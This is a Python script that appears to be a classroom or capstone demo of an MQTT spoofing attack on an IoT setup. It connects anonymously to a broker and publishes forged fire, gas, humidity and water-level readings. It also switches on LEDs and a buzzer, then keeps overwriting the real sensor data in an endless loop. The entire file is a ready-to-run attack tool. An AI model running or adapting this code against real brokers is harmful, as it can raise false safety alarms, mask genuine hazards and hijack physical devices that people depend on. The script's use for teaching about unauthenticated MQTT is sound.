"""
spoof_attack.py - MQTT Spoofing Attack Demo
Continuously publishes fake data to override real sensor readings
"""
import paho.mqtt.client as mqtt
import time

BROKER_IP   = "10.246.143.76"
BROKER_PORT = 1883  # Main broker (set allow_anonymous true first)

connected = False

def on_connect(client, userdata, flags, reason_code, properties):
    global connected
    if reason_code == 0:
        connected = True
        print("=" * 60)
        print("  [ATTACKER] Connected — NO credentials needed!")
        print("  [ATTACKER] Attack running... Press Ctrl+C to stop")
        print("=" * 60)
    else:
        print(f"[ATTACKER] Connection failed (rc={reason_code})")
        print("[ATTACKER] Broker may have authentication enabled!")

client = mqtt.Client(
    mqtt.CallbackAPIVersion.VERSION2,
    client_id="Attacker_IoT_Spoofer"
)
client.on_connect = on_connect

print(f"[ATTACKER] Targeting {BROKER_IP}:{BROKER_PORT} (no credentials)...")
try:
    client.connect(BROKER_IP, BROKER_PORT)
except Exception as e:
    print(f"[ATTACKER] Cannot connect: {e}")
    exit()

client.loop_start()
time.sleep(2)

if not connected:
    print("[ATTACKER] Could not connect. Broker may be secured.")
    client.loop_stop()
    exit()

# Phase 1 — Initial attack burst
print("\n[PHASE 1] Initial attack burst...\n")
initial_attacks = [
    ("esp32/temp",            "99",           "FAKE temperature: 99°C — FIRE ALERT"),
    ("esp32/hum",             "5",            "FAKE humidity: 5% — dangerously dry"),
    ("esp32/gas",             "4095",         "FAKE gas: MAX — GAS ALERT"),
    ("esp32/gas/status",      "ALERT",        "Gas status forced to ALERT"),
    ("capstone/alert",        "GAS_DETECTED", "GAS_DETECTED alert triggered"),
    ("pico2/water/level",     "0",            "Water tank set to 0%"),
    ("pico2/water/status",    "CRITICAL",     "Water status forced CRITICAL"),
    ("arm/status",            "OFFLINE",      "ARM Node faked as OFFLINE"),
    ("capstone/esp32/led",    "ON",           "ESP32 LED hijacked ON"),
    ("capstone/esp32/buzzer", "ON",           "Buzzer hijacked ON"),
    ("capstone/pico2/led",    "ON",           "Pico LED hijacked ON"),
]

for topic, payload, description in initial_attacks:
    print(f"  [ATTACK] {description}")
    client.publish(topic, payload)
    time.sleep(1)

# Phase 2 — Continuous override loop
print("\n[PHASE 2] Continuously overriding real sensor data...\n")
print("  Real sensors are publishing truth — attacker keeps overriding!")
print("  Dashboard is now under attacker control.\n")

attack_round = 1
try:
    while True:
        print(f"  [ROUND {attack_round}] Sending fake data...")
        client.publish("esp32/temp",            "99")
        client.publish("esp32/hum",             "5")
        client.publish("esp32/gas",             "4095")
        client.publish("esp32/gas/status",      "ALERT")
        client.publish("capstone/alert",        "GAS_DETECTED")
        client.publish("pico2/water/level",     "0")
        client.publish("pico2/water/status",    "CRITICAL")
        client.publish("arm/status",            "OFFLINE")
        attack_round += 1
        time.sleep(2)  # Publish every 2 seconds — faster than real sensors (3s)

except KeyboardInterrupt:
    print("\n\n[ATTACKER] Attack stopped by user.")
    print("=" * 60)
    print("  DEMO POINT: Real sensor data will now recover.")
    print("  This shows attack stops when attacker disconnects.")
    print("=" * 60)

client.loop_stop()
client.disconnect()
